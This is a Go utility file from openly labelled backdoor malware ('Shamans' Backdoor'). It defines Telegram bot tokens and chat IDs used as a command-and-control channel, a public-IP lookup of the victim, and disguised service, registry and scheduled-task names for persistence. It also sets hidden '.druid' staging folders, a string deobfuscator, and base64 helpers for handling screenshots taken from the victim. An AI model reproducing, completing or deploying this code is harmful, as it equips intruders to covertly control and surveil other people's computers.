package util

import (
	"encoding/base64"
	"io/ioutil"
	"log"
	"os"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

const (
	Soul = "CharacterizationString"

	RFoxID      = TelegramBotID
	BotToken    = "TelegramBot:Token"
	ListID      = TelegramBotID2
	ListToken   = "TelegramBot:Token2"
	ChatID      = TelegramUserID
	GenesisText = "Necromancer"
	Interval    = 5

	Ads         = "string"
	Binary      = "necro.exe"
	Service     = "Ritual"
	DisplayName = "ShamanBD"
	Description = "Shamans' Backdoor | 7heDeadBunnyCollectiv3"
	Registry    = "Memserv2"
	Task        = "Memserv2"
	Lock        = "lock"

	IPProvider = "http://api.ipify.org"
	Version    = "0.2"
)

var (
	TBApi *tgbotapi.BotAPI

	Doze      int    = 5
	C1        bool   = false
	C3        bool   = false
	Dem       bool   = false
	Dbg       bool   = false
	Spirit    bool   = false
	ID        string = "Shaman"
	Mycellium string = "SecretAccessKey"
	StartTime        = time.Now()
	Base             = [...]string{
		"C:\\.druid",
		"$userprofile\\Saved Games\\.druid",
		"$userprofile\\Documents\\.druid",
		"$temp\\.druid",
	}
)

func WriteLog(ltype string, message string) {
	f, err := os.Stat(ltype + "_Debug.Log")
	Handle(err)
	var file *os.File
	if f == nil {
		file, err = os.Create(ltype + "_Debug.Log")
		Handle(err)
	} else {
		file, err = os.OpenFile(ltype+"_Debug.Log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		Handle(err)
	}
	defer file.Close()

	_, err2 := file.WriteString(message + "\n")

	if err2 != nil {
		msg := tgbotapi.NewMessage(ChatID, "[<b>ERROR</b>\t Could not write <i>"+ltype+"</i> logs")
		msg.ParseMode = "HTML"
		TBApi.Send(msg)
	}
}

func Deobfuscate(Data string) string {
	var ClearText string
	for i := 0; i < len(Data); i++ {
		ClearText += string(int(Data[i]) - 1)
	}
	return ClearText
}

func ToBase64(b []byte) string {
	return base64.StdEncoding.EncodeToString(b)
}
func Tb64(text string) string {
	encodedText := base64.StdEncoding.EncodeToString([]byte(text))
	return encodedText
}
func IF64(text string, tag string) string {
	encodedText, err := base64.StdEncoding.DecodeString(text)
	if err != nil {
		log.Println(err)
	}
	f, err := os.Create(tag + "_Screenshot.png")
	Handle(err)
	defer f.Close()
	if _, err := f.Write(encodedText); err != nil {
		log.Println(err)
		return err.Error()
	}
	return "Successful"
}
func Fb64(text string) string {
	encodedText, err := base64.StdEncoding.DecodeString(text)
	if err != nil {
		log.Println(err)
	}
	return string(encodedText)
}
